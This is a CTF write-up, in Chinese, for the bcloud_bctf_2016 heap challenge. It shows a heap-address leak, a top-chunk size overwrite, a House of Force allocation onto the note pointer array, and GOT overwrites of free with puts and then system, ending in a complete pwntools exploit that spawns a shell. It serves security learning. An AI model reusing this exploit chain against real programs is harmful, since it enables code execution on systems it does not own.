# bcloud_bctf_2016


### 总结

根据本题，学习与收获有：
- `house of force`不需要保证`top chunk`的`size`域是合法的，但是`house of orange`需要保证`size`域合法，因为后一种利用方式会把`top chunk`放在`unsorted bin`，会有`chunk size`的检查。
- `house of force`一般需要泄露出`heap`地址，并且需要能改写`top chunk`的`size`域，还要能分配任意大小的内存，总的来说，条件还是很多的。可以直接分配到`got`表附近，但是这样会破坏一些`got`表的内容，也可分配到堆指针数组，一般在`bss`或者`data`段。
- `strcpy`会一直拷贝源字符串，直到遇到`\x0a`或者`\x00`字符。并且在拷贝结束后，尾部添加一个`\x00`字符，很多`off by one`的题目就是基于此。

<!-- more -->


### 题目分析
题目的运行环境是`ubuntu 16`，使用`libc-2.23.so`。

#### checksec
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403114227.png)
**注意**：`arch`为`i386-32-little`。
#### 函数分析
很明显，这又是一个菜单题。首先来看`main`函数：
##### main
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162034.png)
在进入`while`循环之前，首先调用了`welcome`函数*引用与参考[1]*，然后再去执行循环体。继续来看一下`welcome`中有什么操作。

##### welcome
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162733.png)
这里面调了两个函数，继续分析

##### get_name
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png)

这里面操作为：

- 向栈变量`s`写入`0x40`大小的数据，有一个字节的溢出
- 申请内存，`malloc(0x40)`，得到的`chunk`大小为`0x48`
- 调用`strcpy`，把`s`的数据拷贝到刚刚申请的`chunk`的用户内存区域。

这里存在一个漏洞点，越界拷贝了堆地址，在后面的漏洞点中会有分析。

顺便放一下`read_off_by_one`函数和`put_info`函数：

**read_off_by_one**:

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163449.png)

**put_info**:

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163542.png)

##### get_org_host
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png)

这里涉及到两次向栈变量上写数据，并且两次申请堆内存，两次调用`strcpy`接口。这里存在着溢出漏洞，后续**漏洞点**中会进一步分析。

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164026.png)

##### new_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164143.png)

此住需要注意的点有：

- `ptr_array`里面最多填满`10`个地址
- 实际申请的`chunk`的大小是`size + 4`，能写的大小却是`size`，基本上不能使用`off by one`

##### show_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164422.png)

##### edit_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164539.png)

从`ptr_array`数组和`ptr_size`数组中取出存储的地址和大小，并重新获取用户输入并写入数据。

##### del_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164724.png)

释放指针指向的内存后直接将指针置为`0`

#### 漏洞点

一开始看这个程序的时候，一直把目光对准了`while`循环体里面，几个关于`note`的函数，因为一般情况下，漏洞点会出现在这些函数里面，事实证明，**惯性思维害死人**。找了半天，啥洞也没找到，最后把目光聚焦在`welcome`里面的两个函数，才发现了利用点。接下来，详细讲一讲漏洞点。

##### 漏洞点1：get_name泄露堆地址

**get_name**:

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png)

这里画一下栈内存与堆内存的变化：

**填充内容前**：

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173227.png)

**填充内容后**：

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173339.png)

因此，当填慢`0x40`个可见字符后，调用`put_info`打印内容的时候会把上面的`chunk`的地址给打印出来。

##### 漏洞点2：get_org_host修改top chunk的size域

**get_org_host**函数：

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png)

**填充前**：

>![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192414.png)

**往栈变量`s`和`p`写了数据，并分配内存后**：

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192449.png)

**执行两次`strcpy`**后：

> ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192924.png)

可以看到`top chunk`的`size`域被更改了。

### 利用思路

#### 知识点

- 本题主要使用[House of Force Attack][house of force]，注意，这个攻击方法在`2.23、2.27`版本的`libc`是奏效的，在`libc-2.29.so`加了`top chunk`的`size`域合法性的校验。
- 计算大小的时候，可以就直接给`malloc`传一个负数，会自动转化为正整数的。
- 可以在调试过程中确定要分配的那个大小，计算得到的`size`可能会有一些偏移。

#### 利用过程

利用步骤：

- 在`get_name`接口中，输入`0x40 * 'a'`，泄露出堆地址
- 通过`get_org_host`覆盖`top chunk`的`size`，修改为`0xffffffff`。
- 利用`house of force`分配到`ptr_array`，即地址为`0x0x804b120`。
- 连续分配4个用户大小为`0x44`大小的`chunk A、B、C、D`。那么，编辑`chunk A`的时候，就能直接修改`ptr_array`数组元素的地址。*引用与参考[2]*。
- 调用`edit_note`，编辑`chunk A`，将`ptr_array[2]`设置为`free@got`，将`ptr_array[3]`设置为`printf@got`。
- 调用`edit_note`，编辑`ptr_array[2]`的内容为`puts@plt`，就是将`free@got`修改为了`puts@plt`地址。
- 调用`del_note`，去释放`ptr_array[3]`，实际上调用的是`puts`打印出来了`printf`的地址。
- 再次调用`edit_note`，编辑`chunk A`，将`ptr_array[0]`设置为`0x804b130`，`ptr_array[2]`设置为`free@got`，将`ptr_array[4]`写为`/bin/sh`
- 调用`edit_note`，将`free@got`修改为了`system`地址
- 调用`del_note`，释放`ptr_array[0]`，即可`getshell`

### EXP

#### 调试过程

定义好函数：

```python
def new_note(size, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def edit_note(idx, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_note(idx, io:tube=sh):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))
```

执行`get_name`，泄露`heap`地址：

```python
sh.sendafter("Input your name:\n", 'a' * 0x40)
sh.recvuntil('a' * 0x40)
leak_heap_addr = u32(sh.recvn(4))
LOG_ADDR('leak_heap_addr', leak_heap_addr)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403215844.png)

执行`get_org_host`，修改`top chunk`的`size`为`0xffffffff`：

```python
sh.sendafter("Org:\n", 'a' * 0x40)
sh.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
sh.recvuntil("OKay! Enjoy:)\n")
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220024.png)

计算出`top chunk`的地址，分配到`0x804b120`：

```python
top_chunk_addr = leak_heap_addr + 0xd0
ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr
new_note(margin - 20, "") # 0
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220246.png)

连续分配四块`chunk`，修改`free@got`的内容为`puts@plt`，泄露出`libc`的地址：

```python
free_got = 0x804b014
puts_plt = 0x8048520
printf_got = 0x804b010
for _ in range(4):
    new_note(0x40, 'aa')
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))
edit_note(2, p32(puts_plt))
del_note(3)
msg = sh.recvuntil("Delete success.\n")
printf_addr = u32(msg[:4])
LOG_ADDR('printf_addr', printf_addr)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220528.png)

计算出`system`地址，修改`free@got`为`system`函数的地址，并准备好`/bin/sh`：

```python
system_addr = printf_addr - offset
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')
edit_note(2, p32(system_addr))
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220618.png)

释放带有`/bin/sh`的`chunk`，即可`getshell`：

```python
del_note(0)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220657.png)

#### 完整exp

```python
from pwn import *
context.update(arch='i386', os='linux')

sh = process('./bcloud_bctf_2016')

LOG_ADDR = lambda s, i:log.info('{} ===> {}'.format(s, i))

def new_note(size, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def edit_note(idx, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_note(idx, io:tube=sh):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))

sh.sendafter("Input your name:\n", 'a' * 0x40)
sh.recvuntil('a' * 0x40)

leak_heap_addr = u32(sh.recvn(4))
LOG_ADDR('leak_heap_addr', leak_heap_addr)

sh.sendafter("Org:\n", 'a' * 0x40)

sh.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
sh.recvuntil("OKay! Enjoy:)\n")

top_chunk_addr = leak_heap_addr + 0xd0

ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr

new_note(margin - 20, "") # 0

free_got = 0x804b014
puts_plt = 0x8048520
printf_got = 0x804b010

for _ in range(4):
    new_note(0x40, 'aa')

edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))

edit_note(2, p32(puts_plt))

del_note(3)

msg = sh.recvuntil("Delete success.\n")

printf_addr = u32(msg[:4])
LOG_ADDR('printf_addr', printf_addr)

if all_parsed_args['debug_enable']:
    offset =  0xe8d0 # 0x10470
else:
    libc = LibcSearcher('printf', printf_addr)
    libc_base = printf_addr - libc.dump('printf')
    LOG_ADDR('libc_base', libc_base)
    offset = libc.dump('printf') - libc.dump('system')
    LOG_ADDR('offset', offset)

system_addr = printf_addr - offset

edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

edit_note(2, p32(system_addr))

del_note(0)

sh.interactive()
```

### 引用与参考

以下为引用与参考，可能以脚注的形式呈现！

[house of force]: https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_force/
**\[1\]**：本文的函数均已重命名，原二进制文件不带符号信息

**\[2\]**：其实这里可以直接去控制`ptr_size`数组，一直到`ptr_array`，这样还可以控制`size`，分配一个`chunk`就够操作了。

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-04-03-bcloud-bctf-2016/  

